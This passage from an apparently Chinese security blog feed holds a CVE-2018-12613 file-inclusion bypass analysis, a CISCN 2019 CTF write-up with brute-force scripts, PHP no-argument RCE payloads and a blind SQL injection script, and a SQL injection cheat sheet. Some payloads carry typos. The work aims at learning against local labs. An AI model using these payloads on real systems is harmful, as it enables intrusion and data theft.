class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>传入 <code>file=hint.php</code> ，在第一个 <code>in_array</code> 处会返回 true，然后直接包含 <code>hint.php</code></li><li>传入 <code>file=hint.php?/../cookie.txt</code> ，在第二个 <code>in_array</code> 处会返回 true，第二个 <code>in_array</code> 中的 <code>_page</code> 为 <code>hint.php</code> ，然后包含 <code>hint.php?/../cookie.txt</code> ，但是这里的 <code>?</code> 起到传递参数的作用而不是破坏路径</li><li>传入 <code>file=hint.php%253f/../cookie.txt</code> ，在第三个 <code>in_array</code> 处会返回 true ，第三个 <code>in_array</code> 中的 <code>_page</code> 为 <code>hint.php</code> ，然后包含 <code>hint.php%3f/../cookie.txt</code> ，这里的 <code>%3f</code> 即 <code>?</code> ，破坏了路径，前面部分的路径不存在，可以包含后面的文件</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复现 CVE-2018-12613 的一些思考，关于文件包含路径的问题&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
      <category term="文件包含的路径" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E8%B7%AF%E5%BE%84/"/>
    
  </entry>
  
  <entry>
    <title>2019CISCN华南线下两道web复现</title>
    <link href="http://yoursite.com/2019/06/25/2019CISCN%E5%8D%8E%E5%8D%97%E7%BA%BF%E4%B8%8B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/06/25/2019CISCN华南线下部分web复现/</id>
    <published>2019-06-25T14:43:09.680Z</published>
    <updated>2019-08-27T15:31:43.748Z</updated>
    
    <content type="html"><![CDATA[<p>原帖地址 : <a href="https://xz.aliyun.com/t/5558" target="_blank" rel="noopener">https://xz.aliyun.com/t/5558</a></p><p>2019CISCN华南线下的两个简单 web</p><p>部分题目下载地址，有的不完整 : <a href="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn.zip" target="_blank" rel="noopener">点我点我</a></p><a id="more"></a><h1 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h1><ul><li><p>考点 : 无参函数的 RCE</p></li><li><p>在注释中发现了 forgetpassword.php 页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1.png" alt></p></li><li><p>打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 <code>admin123</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/ciscn/web1/useri.php"</span></span><br><span class="line"></span><br><span class="line">response = <span class="string">"没有这个用户"</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./username.txt"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">line = line.strip()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"user_name"</span> : line,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(line)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>输入 admin123 之后跳转到 useryzm.php 页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_2.png" alt></p></li><li><p>提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 <code>MTQyMw==</code></p><p>四位数字生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">s = str(i).zfill(<span class="number">4</span>)</span><br><span class="line">print(s)</span><br><span class="line">f = open(<span class="string">"num.txt"</span>,<span class="string">'a'</span>)</span><br><span class="line">f.write(s)</span><br><span class="line">f.write(<span class="string">'\n'</span>)   <span class="comment">#实现换行的功能</span></span><br></pre></td></tr></table></figure><p>爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/ciscn/web1/yzmi.php'</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./num.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">response = <span class="string">"错误"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">line = line.strip().encode(<span class="string">'utf-8'</span>)</span><br><span class="line">line = base64.b64encode(line)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"yzm"</span> : line.decode(<span class="string">'utf-8'</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(line)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>输入后获得密码 <code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_3.png" alt></p></li><li><p>返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_4.png" alt></p></li><li><p>mDjNaF.php 页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_5.png" alt></p></li><li><p>看一下正则，<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code>，<code>\W</code> 匹配任意字母和数字，<code>(?R)?</code> 重复整个模式，合在一起类似于匹配 <code>x(y(z()))</code> 样式的，且不能存在参数，输入 <code>phpinfo();</code> 可以查看 phpinfo 页面</p></li><li><p>接下来就是构造无参数函数进行 RCE 了，想到可以<strong>更改 header 中的属性和值</strong>，使用无参数函数获取 header 处的值，达到 RCE 的目的。</p></li><li><p>对于 Cookie 属性，我们可以随意更改，session_id() 函数可以获取 PHPSESSID，如果没有开启 session 可以使用 session_start() 函数。由于不能带参数，我们可以将命令转化为 hex 再用 hex2bin() 函数转化。</p></li><li><p>payload : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line"><span class="comment">// echo 'peri0d';</span></span><br><span class="line">Cookie: PHPSESSID=<span class="number">6563686</span>f2027706572693064273b</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_6.png" alt></p></li><li><p>还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE</p></li><li><p>payload : <code>?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;))</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web1_7.png" alt></p></li></ul><h1 id="web-4"><a href="#web-4" class="headerlink" title="web 4"></a>web 4</h1><ul><li><p>考点 : insert() 盲注</p></li><li><p>一个登录页面</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_1.png" alt></p></li><li><p>试一试万能密码 <code>admin&#39;#</code> ，登录成功，并给出提示</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_2.png" alt></p></li><li><p>经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过</p></li><li><p>给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_3.png" alt></p></li><li><p><code>insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;)</code> 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。<code>insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)</code>把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。</p></li><li><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.27.137.145/ciscn/web4/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"</span></span><br><span class="line"></span><br><span class="line">temp_list = []</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">255</span>):</span><br><span class="line">payload_1 = <span class="string">"')&gt;(insert((select(load_file('/flag'))),"</span>+str(i)+<span class="string">",255,'')))#"</span></span><br><span class="line">flag = <span class="string">''</span>.join(flag_list)</span><br><span class="line">temp_list.clear()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">payload = <span class="string">"admin'^(select('"</span>+flag+chr(j)+payload_1</span><br><span class="line">print(payload)</span><br><span class="line">data = &#123;<span class="string">'username'</span> : payload,&#125;</span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">temp_list.append(chr(j))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">flag_list.append(temp_list.pop())</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">''</span>.join(flag_list))</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn_2019_HuaNan_web4_4.png" alt></p></li><li><p>过滤语句 : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i"</span>,$username))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i"</span>,$passwd))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'wafed!&lt;br&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原帖地址 : &lt;a href=&quot;https://xz.aliyun.com/t/5558&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/5558&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2019CISCN华南线下的两个简单 web&lt;/p&gt;
&lt;p&gt;部分题目下载地址，有的不完整 : &lt;a href=&quot;https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/ciscn_2019_HuaNan/ciscn.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;点我点我&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="CISCN" scheme="http://yoursite.com/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入</title>
    <link href="http://yoursite.com/2019/06/10/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/06/10/SQL注入总结/</id>
    <published>2019-06-10T01:58:16.107Z</published>
    <updated>2019-08-27T15:34:07.668Z</updated>
    
    <content type="html"><![CDATA[<p>自己做的注入总结，包含了常见的问题，会随着比赛的扩充而扩充</p><a id="more"></a><h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><h2 id="sqli-labs-和-dvwa"><a href="#sqli-labs-和-dvwa" class="headerlink" title="sqli-labs 和 dvwa"></a>sqli-labs 和 dvwa</h2><p>在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1</p><p>由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况</p><p>同样的在 Less-25 中，过滤了 and 和 or ，如果直接使用 &amp;&amp; ，是会报错的，应用 %26%26</p><p>在 dvwa 的注入中，在提交 id 时会对提交内容进行一次 URLencode，所以在那个框框里面输入 1’ %23 是无法起到注释作用的，通过抓包发现其请求的是 ?id=1’%2523，其中 %25 是 % 的URL编码。在sqli-labs的 POST 注入中也会出现上述情况。</p><h2 id="一些闭合方式"><a href="#一些闭合方式" class="headerlink" title="一些闭合方式"></a>一些闭合方式</h2><p>‘$id’，”$id”，(‘$id’)，(“$id”)，{“$id”}，{‘$id’}</p><h1 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入"></a>GET型注入</h1><h2 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h2><p>字符型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos;1&apos;&apos; LIMIT 0,1 </span><br><span class="line">//有三个 &apos; ，猜 MySQL 语句 select * from table where id=&apos;$id&apos; </span><br><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1&apos;%23 //返回正常</span><br></pre></td></tr></table></figure><p>数字型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos; LIMIT 0,1 </span><br><span class="line">//有一个 &apos; ，猜 MySQL 语句 select * from table where id=$id </span><br><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1+1 //返回正常</span><br></pre></td></tr></table></figure><h2 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union slect 1,2,3 %23  </span><br><span class="line">?id=1&apos; order by 3 %23  </span><br><span class="line">//返回正确，说明MySQL为select column1,column2,column3 from table where id=&apos;$id&apos;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//当前数据库 </span><br><span class="line">?id=1&apos; uinon select databse(),2,3 %23 </span><br><span class="line">//所有数据库 </span><br><span class="line">?id=1&apos; union select 1,select schema_name from INFORMATION_SCHEMA.schemata,3 %23</span><br></pre></td></tr></table></figure><h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select table_name from information_schema.tables where table_schema=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure><h2 id="数据列"><a href="#数据列" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select column_name from information_schema.columns where table_name=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure><h2 id="数据内容"><a href="#数据内容" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select xxx from xxx,3 %23</span><br></pre></td></tr></table></figure><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>一般布尔盲注中只会出现返回成功和返回失败的界面，不会有union联合查询的。</p><p>盲注分为布尔型，时间型和报错型。</p><p>首先判断注入类型，和以前相同，要注意二分法的应用。</p><h2 id="数据库名称长度"><a href="#数据库名称长度" class="headerlink" title="数据库名称长度"></a>数据库名称长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//用二分法判断范围 </span><br><span class="line">?id=1&apos; and length(database())=8 %23  //返回正确，说明数据库名称长度为8</span><br></pre></td></tr></table></figure><h2 id="数据库名称内容"><a href="#数据库名称内容" class="headerlink" title="数据库名称内容"></a>数据库名称内容</h2><p><strong>left判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)=&apos;s&apos; %23 ?id=1&apos; and left(database(),2)=&apos;se&apos; %23 ?id=1&apos; and left(database(),8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure><p><strong>substr判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=83 %23 ?id=1&apos; and ascii(substr(database(),2,1))=69 %23 ?id=1&apos; and substr(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure><p><strong>regexp判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(database() regexp &apos;^[a-z]&apos;) %23 ?id=1&apos; and 1=(database() regexp &apos;^s[a-z]&apos;) %23 ?id=1&apos; and 1=(database()=&apos;security&apos;) %23</span><br></pre></td></tr></table></figure><p><strong>mid判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ord(mid(database(),1,1))=83 %23 ?id=1&apos; and ord(mid(database(),2,1))=69 %23 ?id=1&apos; and mid(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure><h2 id="数据表-1"><a href="#数据表-1" class="headerlink" title="数据表"></a>数据表</h2><p>先用length()判断长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=5 %23</span><br></pre></td></tr></table></figure><p>然后判断内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//left判断前两位 </span><br><span class="line">?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos; %23 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&apos;em&apos; %23 </span><br><span class="line">//substr判断第三位 </span><br><span class="line">?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)=&apos;a&apos; %23 </span><br><span class="line">//regexp判断第四位 </span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regexp &apos;^emai[a-z]&apos; limit 0,1) %23 </span><br><span class="line">//mid判断第五位 </span><br><span class="line">?id=1&apos; and mid((seanlect table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)=&apos;l&apos; %23</span><br></pre></td></tr></table></figure><p>如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可</p><p>但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png" alt="img"></p><h2 id="数据列-1"><a href="#数据列-1" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;xxxx&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>再进行判断</p><h2 id="数据内容-1"><a href="#数据内容-1" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//ifnull和cast函数，第一位为D </span><br><span class="line">?id=1&apos; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 %23 </span><br><span class="line">//普通方式，第二位为u </span><br><span class="line">?id=1&apos; and ascii(substr((select username from security.users order by id limit 0,1),2,1))=85 %23</span><br></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>使用报错注入的前提是，当前页面能够 print_r(mysql_error()) 或者是 echo(mysql_error())</p><p>后面 from 的表必须是存在的，比如 information_schema.tables 或者 information_schema.columns </p><h2 id="Floor报错"><a href="#Floor报错" class="headerlink" title="Floor报错"></a>Floor报错</h2><p>这两种语句都可以，只是第一个知道字段数是3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//替换 select user() </span><br><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23 </span><br><span class="line">//替换 select schema_name frominformation_schema.schemata limit 0,1 </span><br><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(((select schema_name frominformation_schema.schemata limit 0,1)),&apos;;&apos;,floor (rand(0)*2))x frominformation_schema.tables group by x)a) %23</span><br></pre></td></tr></table></figure><p>简化版Floor报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure><p>如果关键的表被禁用了，可以使用这种形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg" 